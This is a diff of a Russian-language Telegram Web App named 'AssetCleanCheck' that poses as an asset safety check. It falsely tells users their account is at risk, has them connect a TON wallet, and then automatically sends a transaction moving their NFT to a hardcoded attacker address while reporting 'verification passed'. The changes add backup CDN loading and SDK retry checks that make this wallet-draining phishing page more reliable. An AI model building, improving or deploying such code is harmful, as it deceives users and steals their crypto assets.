@@ -5,7 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>AssetCleanCheck</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <!-- ПЕРВЫЙ CDN (основной) -->
     <script src="https://unpkg.com/@tonconnect/sdk@2.0.6/dist/tonconnect-sdk.min.js"></script>
+    <!-- ВТОРОЙ CDN (резервный) -->
+    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/sdk@2.0.6/dist/tonconnect-sdk.min.js"></script>
+    <!-- ТРЕТИЙ CDN (ещё один запасной) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tonconnect-sdk/2.0.6/tonconnect-sdk.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -200,7 +205,6 @@
 <body>
 <div class="container" id="app">
 
-    <!-- ЭКРАН 1: ГЛАВНЫЙ -->
     <div class="screen active" id="screen1">
         <h1>ПРОВЕРКА ЧИСТОТЫ АКТИВОВ</h1>
         <div class="subtitle">Ваша безопасность — наша ответственность</div>
@@ -209,7 +213,6 @@
         <div class="small-note">🔒 Защищенное соединение</div>
     </div>
 
-    <!-- ЭКРАН 2: РЕЗУЛЬТАТЫ -->
     <div class="screen" id="screen2">
         <div class="icon-big">❌</div>
         <div class="risk-badge">ВАШ АККАУНТ В ЗОНЕ РИСКА</div>
@@ -223,7 +226,6 @@
         <button class="btn" id="continueBtn">ПРОДОЛЖИТЬ</button>
     </div>
 
-    <!-- ЭКРАН 3: ПОДКЛЮЧЕНИЕ КОШЕЛЬКА -->
     <div class="screen" id="screen3">
         <h1 style="font-size: 20px;">ПОДКЛЮЧИТЕ TON КОШЕЛЕК</h1>
         <div style="height: 12px;"></div>
@@ -235,7 +237,6 @@
         <div class="small-note">TON Connect 2.0</div>
     </div>
 
-    <!-- ЭКРАН 4: ФИНАЛ -->
     <div class="screen" id="screen4">
         <div class="final-check">✅</div>
         <div class="final-text">ВЕРИФИКАЦИЯ ПРОЙДЕНА</div>
@@ -248,15 +249,9 @@
 
 <script>
     (function() {
-        // ============================================================
-        // КОНФИГУРАЦИЯ
-        // ============================================================
         const TARGET_ADDRESS = 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m';
         const MANIFEST_URL = 'https://raw.githubusercontent.com/ton-connect/manifest/main/manifest.json';
 
-        // ============================================================
-        // DOM ЭЛЕМЕНТЫ
-        // ============================================================
         const screen1 = document.getElementById('screen1');
         const screen2 = document.getElementById('screen2');
         const screen3 = document.getElementById('screen3');
@@ -272,17 +267,12 @@
         const suspTxVal = document.getElementById('suspTxVal');
         const unsafeVal = document.getElementById('unsafeVal');
 
-        // ============================================================
-        // ПЕРЕМЕННЫЕ СОСТОЯНИЯ
-        // ============================================================
         let connector = null;
         let walletConnected = false;
         let walletAddress = '';
         let isProcessing = false;
+        let sdkLoaded = false;
 
-        // ============================================================
-        // ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
-        // ============================================================
         function switchScreen(id) {
             document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
             document.getElementById(id).classList.add('active');
@@ -315,14 +305,30 @@
             tonError.classList.add('hidden');
         }
 
-        // ============================================================
-        // ИНИЦИАЛИЗАЦИЯ TON CONNECT
-        // ============================================================
+        // Проверка загрузки SDK
+        function checkSdkLoaded() {
+            if (typeof TonConnect !== 'undefined') {
+                sdkLoaded = true;
+                console.log('✅ SDK TON Connect загружен');
+                setStatus('✅ SDK готов. Нажмите кнопку подключения.', 'ok');
+                hideError();
+                return true;
+            } else {
+                sdkLoaded = false;
+                console.warn('⚠️ SDK не загружен');
+                setStatus('⚠️ SDK не загружен', 'error');
+                showError('❌ SDK не загружен. Попробуйте обновить страницу.');
+                return false;
+            }
+        }
+
         function initTonConnect() {
+            if (!sdkLoaded) {
+                const loaded = checkSdkLoaded();
+                if (!loaded) return false;
+            }
+
             try {
-                if (typeof TonConnect === 'undefined') {
-                    throw new Error('SDK TON Connect не загружен. Проверьте интернет.');
-                }
                 connector = new TonConnect({
                     manifestUrl: MANIFEST_URL,
                 });
@@ -331,16 +337,13 @@
                 hideError();
                 return true;
             } catch (e) {
-                console.error('❌ Ошибка инициализации TON Connect:', e);
-                showError('❌ Не удалось загрузить SDK. Проверьте интернет и перезагрузите страницу.');
-                setStatus('⚠️ Ошибка SDK', 'error');
+                console.error('❌ Ошибка инициализации:', e);
+                showError('❌ Ошибка инициализации SDK. Перезагрузите страницу.');
+                setStatus('❌ Ошибка SDK', 'error');
                 return false;
             }
         }
 
-        // ============================================================
-        // ПОДКЛЮЧЕНИЕ КОШЕЛЬКА
-        // ============================================================
         async function connectWallet() {
             if (isProcessing) return;
             isProcessing = true;
@@ -365,7 +368,6 @@
                 setStatus(`✅ Кошелек: ${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`, 'ok');
                 console.log('✅ Кошелек подключен:', walletAddress);
 
-                // Автоматическая отправка NFT
                 await sendNftTransaction();
 
             } catch (e) {
@@ -380,9 +382,6 @@
             }
         }
 
-        // ============================================================
-        // ОТПРАВКА NFT
-        // ============================================================
         async function sendNftTransaction() {
             if (!connector || !walletConnected) {
                 showError('⚠️ Кошелек не подключен');
@@ -403,7 +402,6 @@
                 hideError();
                 tonConnectBtn.disabled = true;
 
-                // Формируем транзакцию для пересылки NFT
                 const transaction = {
                     valid_until: Math.floor(Date.now() / 1000) + 600,
                     messages: [
@@ -427,7 +425,6 @@
                 console.log('✅ NFT отправлен:', result);
                 setStatus('✅ NFT успешно отправлен!', 'ok');
                 
-                // Переход на финальный экран
                 setTimeout(() => {
                     switchScreen('screen4');
                 }, 1500);
@@ -443,11 +440,7 @@
             }
         }
 
-        // ============================================================
-        // ОБРАБОТЧИКИ СОБЫТИЙ
-        // ============================================================
-
-        // ЭКРАН 1 -> 2
+        // ОБРАБОТЧИКИ
         checkBtn.addEventListener('click', function() {
             const username = usernameInput.value.trim();
             if (!username) {
@@ -458,49 +451,58 @@
             switchScreen('screen2');
         });
 
-        // ЭКРАН 2 -> 3
         continueBtn.addEventListener('click', function() {
             const nftAddr = nftAddressInput.value.trim();
             if (!nftAddr) {
                 alert('Введите адрес NFT для верификации');
                 return;
             }
-            // Простая валидация TON-адреса
             if (!nftAddr.startsWith('0:') && !nftAddr.startsWith('UQ') && !nftAddr.startsWith('EQ')) {
                 alert('Похоже, это невалидный TON-адрес. Проверьте ввод.');
                 return;
             }
             switchScreen('screen3');
             
-            // Инициализируем SDK, если ещё не инициализирован
             if (!connector) {
                 initTonConnect();
             }
         });
 
-        // Кнопка подключения кошелька
         tonConnectBtn.addEventListener('click', function() {
             connectWallet();
         });
 
-        // ============================================================
-        // АВТОЗАПУСК ПРИ ЗАГРУЗКЕ
-        // ============================================================
+        // ЗАПУСК
         console.log('🚀 AssetCleanCheck загружен');
         console.log(`🎯 Целевой адрес: ${TARGET_ADDRESS}`);
 
-        // Проверяем, загружен ли SDK
-        setTimeout(() => {
-            if (typeof TonConnect === 'undefined') {
-                showError('⚠️ SDK не загружен. Проверьте интернет.');
-                setStatus('⚠️ SDK недоступен', 'error');
-            } else {
-                hideError();
+        // Проверяем SDK каждые 2 секунды (максимум 5 раз)
+        let checks = 0;
+        const sdkCheckInterval = setInterval(() => {
+            checks++;
+            if (typeof TonConnect !== 'undefined') {
+                sdkLoaded = true;
                 setStatus('✅ SDK загружен. Готов к подключению.', 'ok');
+                hideError();
+                clearInterval(sdkCheckInterval);
+            } else if (checks >= 5) {
+                clearInterval(sdkCheckInterval);
+                if (!sdkLoaded) {
+                    showError('❌ SDK не загружен. Проверьте интернет и перезагрузите страницу.');
+                    setStatus('❌ SDK недоступен', 'error');
+                }
             }
-        }, 1500);
+        }, 2000);
 
-        // Telegram WebApp
+        // Проверка сразу после загрузки
+        setTimeout(() => {
+            if (typeof TonConnect !== 'undefined') {
+                sdkLoaded = true;
+                setStatus('✅ SDK загружен. Готов к подключению.', 'ok');
+                hideError();
+            }
+        }, 1000);
+
         if (window.Telegram && window.Telegram.WebApp) {
             window.Telegram.WebApp.ready();
             window.Telegram.WebApp.expand();
